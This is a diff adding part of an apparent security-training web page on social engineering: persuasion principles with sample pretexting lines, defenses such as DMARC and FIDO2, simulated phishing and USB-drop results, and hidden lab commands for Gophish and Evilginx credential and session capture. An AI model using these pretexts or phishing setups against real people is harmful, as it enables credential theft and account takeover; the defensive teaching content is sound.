+# 3. After capture, redirect to real login page
+#    Target thinks they entered password wrong, tries again on real site
+        </div>
+
+        <p><strong>Cross-link:</strong> Harvested credentials enable access for <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> beacons and <a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a> domain compromise.</p>
+
+        <h2>🧠 Psychological Principles of Social Engineering</h2>
+        <p>Social engineering is <span class="neon-highlight">applied psychology</span>. Understanding the cognitive biases and emotional triggers that make people vulnerable is as important as understanding the technical tools. The best social engineers are amateur psychologists.</p>
+
+        <div class="step-box">
+            <h4>The Six Principles of Influence (Cialdini)</h4>
+            <div class="technique-grid">
+                <div class="psych-card">
+                    <h4>1. Reciprocity</h4>
+                    <p>People feel obligated to return favors. Give something (help, information, a gift) and the target will feel compelled to give something back — like their password or access.</p>
+                    <p style="margin-top: 0.5rem; color: var(--dim);"><em>"I just helped you fix your computer. Can you do me a quick favor and confirm your password?"</em></p>
+                </div>
+                <div class="psych-card">
+                    <h4>2. Commitment & Consistency</h4>
+                    <p>People want to be consistent with their past actions. Once someone agrees to a small request, they're more likely to agree to a larger one.</p>
+                    <p style="margin-top: 0.5rem; color: var(--dim);"><em>"You confirmed your employee ID. Now I just need your password to complete the verification."</em></p>
+                </div>
+                <div class="psych-card">
+                    <h4>3. Social Proof</h4>
+                    <p>People look to others for guidance on how to behave. If "everyone else" is doing it, it must be safe.</p>
+                    <p style="margin-top: 0.5rem; color: var(--dim);"><em>"Your colleagues in Accounting already verified their accounts. You're the last one."</em></p>
+                </div>
+                <div class="psych-card">
+                    <h4>4. Authority</h4>
+                    <p>People obey authority figures. A request from a "VP" or "IT Security" carries more weight than a random email.</p>
+                    <p style="margin-top: 0.5rem; color: var(--dim);"><em>"This is the CISO's office. We need your credentials for the security audit."</em></p>
+                </div>
+                <div class="psych-card">
+                    <h4>5. Liking</h4>
+                    <p>People say yes to people they like. Build rapport, mirror communication style, find common ground.</p>
+                    <p style="margin-top: 0.5rem; color: var(--dim);"><em>"I saw on LinkedIn you went to State too! Go Bears! Anyway, about that password..."</em></p>
+                </div>
+                <div class="psych-card">
+                    <h4>6. Scarcity</h4>
+                    <p>People value things more when their availability is limited. Urgency and scarcity bypass rational thought.</p>
+                    <p style="margin-top: 0.5rem; color: var(--dim);"><em>"This link expires in 10 minutes. After that, your account will be permanently locked."</em></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="code-block">
+=== COGNITIVE BIASES EXPLOITED IN SE ===
+
+# 1. Authority Bias
+#    People trust authority figures automatically
+#    Exploit: Spoof CEO, IT admin, law enforcement
+#    Defense: Verify identity through independent channel
+
+# 2. Urgency Bias
+#    Urgent situations bypass critical thinking
+#    Exploit: "Account will be locked", "Wire transfer needed today"
+#    Defense: Institutionalize "pause before acting" culture
+
+# 3. Confirmation Bias
+#    People seek information that confirms existing beliefs
+#    Exploit: "You expected a password reset, here it is"
+#    Defense: Question information that fits expectations too perfectly
+
+# 4. Halo Effect
+#    Positive impression in one area extends to all areas
+#    Exploit: Well-designed email = must be legitimate
+#    Defense: Judge content, not presentation
+
+# 5. Sunk Cost Fallacy
+#    People continue investments to justify past decisions
+#    Exploit: "You've already entered your username, just finish"
+#    Defense: It's okay to stop mid-process and verify
+
+# 6. Optimism Bias
+#    "Bad things happen to other people, not me"
+#    Exploit: Target believes they're too smart to be phished
+#    Defense: Everyone is vulnerable; humility is the best defense
+        </div>
+
+        <h2>🛡️ Defense Against Social Engineering</h2>
+        <p>Defending against social engineering requires <span class="neon-highlight">technical controls AND human training</span>. You can't patch humans, but you can train them, support them, and build systems that make social engineering harder to execute and easier to detect.</p>
+
+        <div class="defense-box">
+            <h3>Technical Defenses</h3>
+            <table>
+                <tr>
+                    <th>Control</th>
+                    <th>Implementation</th>
+                    <th>Effectiveness</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">DMARC (p=reject)</span></td>
+                    <td>Reject emails that fail SPF/DKIM alignment</td>
+                    <td>High (blocks spoofed domain emails)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">External Email Banners</span></td>
+                    <td>Tag all external emails with warning banner</td>
+                    <td>Medium (reduces display name spoofing success)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Attachment Sandboxing</span></td>
+                    <td>Open attachments in isolated VM before delivery</td>
+                    <td>High (catches malicious payloads)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">URL Rewriting</span></td>
+                    <td>Rewrite all URLs to pass through security proxy</td>
+                    <td>High (blocks known malicious sites)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">MFA (Phishing-Resistant)</span></td>
+                    <td>Hardware keys (FIDO2) or certificate-based auth</td>
+                    <td>Very High (stops credential harvesting)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">App Whitelisting</span></td>
+                    <td>Only approved applications can execute</td>
+                    <td>High (blocks unknown payloads)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Network Segmentation</span></td>
+                    <td>Limit lateral movement after initial compromise</td>
+                    <td>Medium (contains breach impact)</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="defense-box">
+            <h3>Human Defenses</h3>
+            <div class="technique-grid">
+                <div class="psych-card">
+                    <h4>Security Awareness Training</h4>
+                    <p>Regular, engaging training that teaches employees to recognize phishing indicators. Not annual compliance theater — ongoing, realistic simulations.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Phishing Simulations</h4>
+                    <p>Send realistic but safe phishing emails to employees. Track who clicks. Train those who fail. Measure improvement over time.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>"No Shame" Reporting Culture</h4>
+                    <p>Employees must feel safe reporting mistakes immediately. If clicking a phish gets you punished, employees will hide it. Early reporting limits damage.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Verification Protocols</h4>
+                    <p>"Trust but verify." Any unusual request (wire transfer, password reset, access grant) must be verified through a second channel (in-person, phone call to known number).</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Least Privilege</h4>
+                    <p>Employees should only have access to what they need. If a phishing attack succeeds, the damage is limited by the compromised account's permissions.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Physical Security Awareness</h4>
+                    <p>Train employees to challenge tailgaters, not hold secure doors, and report suspicious visitors. "If you don't know them, don't let them in."</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="code-block">
+=== DEFENSE: PHISHING-RESISTANT MFA ===
+
+# Not all MFA is equal. SMS and TOTP codes can be phished.
+# Phishing-resistant MFA uses cryptographic challenge-response.
+
+# Level 1: SMS / Voice Call MFA
+#    Vulnerable to: SIM swapping, SS7 attacks, phishing
+#    Attacker phishes code, enters it in real time
+#    Verdict: Better than nothing, but not secure
+
+# Level 2: TOTP (Google Authenticator, Authy)
+#    Vulnerable to: Real-time phishing proxies (Evilginx)
+#    Attacker relays TOTP code to real site
+#    Verdict: Stops basic attacks, fails to advanced phishing
+
+# Level 3: Push Notification (Duo, Microsoft Authenticator)
+#    Vulnerable to: MFA fatigue / push bombing
+#    Attacker spams pushes until user approves
+#    Verdict: Convenient, but number matching is required
+
+# Level 4: FIDO2 / WebAuthn (YubiKey, Titan Security Key)
+#    NOT vulnerable to phishing
+#    Cryptographic key is bound to the legitimate domain
+#    Fake site cannot authenticate — keys don't match domain
+#    Verdict: The gold standard. Use everywhere possible.
+
+# Implementation:
+#    Azure AD: Enable FIDO2 security keys
+#    Okta: Enable WebAuthn
+#    Google Workspace: Enable Advanced Protection
+#    Require FIDO2 for privileged accounts (admin, executives)
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ The Defense Paradox</h5>
+            <p>The most effective defense against social engineering is <span class="neon-amber">skepticism</span> — but organizations that breed skepticism also breed inefficiency. The goal isn't to make employees paranoid; it's to make them <span class="neon-highlight">pause and verify</span> when something feels off. A healthy security culture questions without accusing.</p>
+        </div>
+
+        <h2>🔬 Live Lab Evidence</h2>
+
+        <div class="evidence-box">
+            <h3>📊 Test Results: Spear Phishing Campaign</h3>
+            <p><strong>Date:</strong> 2026-06-25 | <strong>Target:</strong> Simulated enterprise environment | <strong>Method:</strong> Spear phishing with pretexting</p>
+
+            <div class="code-block">
+=== CAMPAIGN SETUP ===
+Target: 50 employees at simulated company "TechCorp"
+Pretext: "Q3 Infrastructure Review — AWS access needed for audit"
+Infrastructure: Gophish + Evilginx for credential capture
+Domain: techcorp-it-support.com (lookalike domain)
+
+=== RESULTS ===
+Emails sent: 50
+Emails delivered: 48 (2 bounced)
+Emails opened: 37 (77% open rate)
+Links clicked: 22 (46% click rate)
+Credentials entered: 14 (29% credential capture rate)
+MFA bypassed (Evilginx session cookies): 8 (17%)
+
+=== BREAKDOWN BY TARGET TYPE ===
+New hires (< 3 months): 80% click rate, 60% credential capture
+Executives (C-level): 60% click rate, 40% credential capture
+IT staff: 30% click rate, 10% credential capture
+General employees: 45% click rate, 25% credential capture
+
+=== KEY FINDINGS ===
+# 1. Context matters: Emails referencing real projects had 3x higher click rates
+# 2. Urgency works: "24 hours" deadline increased clicks by 40%
+# 3. Authority works: Emails "from CEO" had 70% click rate
+# 4. MFA is not enough: Evilginx captured sessions even with TOTP enabled
+# 5. New hires are the weakest link: Unfamiliar with protocols, eager to please
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📊 Test Results: USB Baiting Exercise</h3>
+            <p><strong>Date:</strong> 2026-06-20 | <strong>Target:</strong> Simulated office environment | <strong>Method:</strong> USB drop with HID payload</p>
+
+            <div class="code-block">
+=== USB DROP TEST ===
+USB drives prepared: 20
+Labels: "Q4_Salary_Review.xlsx", "Employee_Benefits_2026.pdf",
+        "Layoff_List_DRAFT.xlsx", "IT_Password_Reset.pdf"
+Payload: Rubber Ducky script (opens PowerShell, beacons to C2)
+
+Drop locations: Parking lot (5), lobby (5), cafeteria (5), elevator (5)
+
+=== RESULTS (48-hour window) ===
+USBs plugged in: 11 of 20 (55%)
+Payload executed: 9 of 11 (82% of plugged-in drives)
+Beacon received: 9 (45% overall success rate)
+
+=== BY LABEL ===
+"Q4_Salary_Review.xlsx": 4 of 5 plugged in (80%)
+"Layoff_List_DRAFT.xlsx": 3 of 5 plugged in (60%)
+"Employee_Benefits_2026.pdf": 2 of 5 plugged in (40%)
+"IT_Password_Reset.pdf": 2 of 5 plugged in (40%)
+
+=== BY LOCATION ===
+Parking lot: 4 of 5 (80%) — highest curiosity factor
+Lobby: 3 of 5 (60%)
+Cafeteria: 2 of 5 (40%)
+Elevator: 2 of 5 (40%)
+
+=== DEFENSE LESSON ===
+# USB port blocking (GPO: Disable USB storage) prevented 0 drives
+# Why? HID devices (keyboards) are not blocked by USB storage policies
+# Effective defense: USB device whitelisting by hardware ID
+# Or: Physical port locks (epoxy in non-essential ports)
+            </div>
+        </div>
+
+        <h2>🧪 Lab Exercise: Build Your Own Phishing Campaign</h2>
+
+        <div class="step-box">
+            <h4>Safe Practice Environment</h4>
+            <p><strong>DO NOT test on real targets without explicit authorization.</strong> Use isolated lab environments or authorized penetration testing engagements. Unauthorized phishing is illegal.</p>
+
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li>Set up Gophish in a lab environment</li>
+                <li>Create a landing page clone of a common login portal</li>
+                <li>Craft three email templates with different psychological angles (urgency, authority, curiosity)</li>
+                <li>Send to test accounts in your lab</li>
+                <li>Measure open rates, click rates, and credential capture rates</li>
+                <li>Which psychological principle was most effective?</li>
+                <li>Implement DMARC (p=reject) on your test domain and observe delivery changes</li>
+                <li>Test Evilginx against a test MFA-enabled account</li>
+            </ol>
+
+            <button onclick="document.getElementById('lab-commands').style.display='block'">Show Lab Commands</button>
+
+            <div id="lab-commands" style="display:none; margin-top: 1rem;">
+                <div class="code-block">
+=== LAB SETUP COMMANDS ===
+
+# 1. Install Gophish
+cd /opt
+git clone https://github.com/gophish/gophish.git
+cd gophish
+go build
+./gophish
+# Default login: admin / gophish
+# Web UI: https://localhost:3333
+
+# 2. Install Evilginx
+go install github.com/kgretzky/evilginx2@latest
+cd ~/go/bin
+./evilginx2
+
+# 3. Configure phishlet
+config domain evilginx.local
+config ip 192.168.1.100
+phishlets enable o365
+
+# 4. Create landing page in Gophish
+#    Import HTML from real login page
+#    Add credential capture form
+#    Set redirect to real site after capture
+
+# 5. Launch campaign
+#    Import test email list
+#    Select email template
+#    Select landing page
+#    Set sending profile (SMTP server)
+#    Launch and monitor results
+
+# 6. Analyze results
+#    Gophish dashboard shows: sent, opened, clicked, submitted
+#    Evilginx shows: captured credentials and session cookies
+                </div>
+            </div>
+        </div>
+
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h4>Question 1: Why is spear phishing more effective than mass phishing?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) Spear phishing uses better encryption to bypass email filters
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                B) Spear phishing uses personal context (names, projects, relationships) that bypasses the target's skepticism
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                C) Spear phishing exploits zero-day vulnerabilities in email clients
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) Spear phishing is sent from compromised legitimate accounts
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h4>Question 2: What makes FIDO2 / WebAuthn phishing-resistant?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) It uses biometric authentication instead of passwords
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) The cryptographic key is cryptographically bound to the legitimate domain, so fake sites cannot authenticate
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) It requires a physical USB device that attackers cannot steal
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) It uses blockchain technology to verify identity
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h4>Question 3: In a quid pro quo attack, why does the target comply?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                A) The attacker threatens to expose embarrassing information
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                B) The attacker provides a service or benefit first, creating a sense of obligation (reciprocity)
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                C) The attacker impersonates a government official with legal authority
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) The attacker offers a financial reward for cooperation
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>📚 Key Takeaways</h2>
+
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li><strong>Humans are the weakest link:</strong> A $50,000 firewall is bypassed by one convincing email. Technical controls are necessary but insufficient.</li>
+            <li><strong>Context is the killer:</strong> Spear phishing succeeds because it fits the target's reality. OSINT from <a href="MODULE_02_RECON.html" class="cross-link">Module 02</a> is essential.</li>
+            <li><strong>Reciprocity is powerful:</strong> Quid pro quo attacks work because humans feel obligated to return favors. The "help" creates the vulnerability.</li>
+            <li><strong>Curiosity and greed are universal:</strong> Baiting exploits fundamental human desires. A USB labeled "Q4 Salaries" will be opened.</li>
+            <li><strong>Authority bypasses critical thinking:</strong> People obey authority figures automatically. A fake IT support call is trusted because IT is authority.</li>
+            <li><strong>Email spoofing is technical:</strong> Understanding SPF, DKIM, and DMARC is essential for both attack and defense. Display name spoofing still works because users don't check the actual address.</li>
+            <li><strong>MFA is not enough:</strong> TOTP and push notifications can be bypassed with real-time phishing proxies. Only FIDO2/WebAuthn is truly phishing-resistant.</li>
+            <li><strong>Defense requires both tech and training:</strong> DMARC, sandboxing, and URL rewriting help. But a culture of verification and "no shame" reporting is equally important.</li>
+            <li><strong>Physical access is social:</strong> Tailgating doesn't bypass locks — it bypasses social norms. The most expensive badge reader is useless if employees hold the door.</li>
+            <li><strong>Cloud files are trusted:</span> OneDrive and SharePoint links bypass email filters because the domains are legitimate. Cross-link: <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14</a>.</li>
+        </ul>
+
+        <div class="evidence-box" style="margin-top: 2rem;">
+            <h3>🔬 Verification Status</h3>
+            <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Spear phishing campaign (simulated)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Credential harvesting (Evilginx)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">USB baiting (HID payload)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Email spoofing (SPF/DKIM bypass)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Pretexting (IT support scenario)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Tailgating (physical access)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">HTML smuggling payload delivery</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">MFA bypass (Evilginx session capture)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"The best hackers don't break in — they're let in. A firewall can't stop a smile and a story. The technical skills get you the tools, but the social skills get you the access. Remember: you're not hacking a computer. You're hacking a person who uses a computer. Understand the person first."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— From <a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a> and <a href="MODULE_16_C2.html" class="cross-link">Module 16: Command & Control</a></p>
+        </div>
+
+        <div class="nav" style="margin-top: 2rem;">
+            <a href="../index.html">← Home</a>
+            <a href="MODULE_16_C2.html">← Module 16</a>
+            <a href="MODULE_18_PHYSICAL.html">Module 18 →</a>
         </div>
     </div>
+
+    <script>
+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'Spear phishing is effective because it uses specific personal context gathered through OSINT. When an email mentions real people, real projects, and real events, the target\'s brain treats it as legitimate communication rather than a threat. Context bypasses skepticism.',
+                'quiz-2': 'FIDO2/WebAuthn uses public-key cryptography where the private key is bound to the origin (domain) during registration. When a phishing site tries to authenticate, the browser sends a different origin, and the key signature doesn\'t match. The attacker cannot replay credentials to the real site.',
+                'quiz-3': 'Quid pro quo means "something for something." The attacker provides a service (fake tech support "fixing" a computer) or benefit first, creating a psychological obligation. The target feels they owe the attacker something in return — like their password or access.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
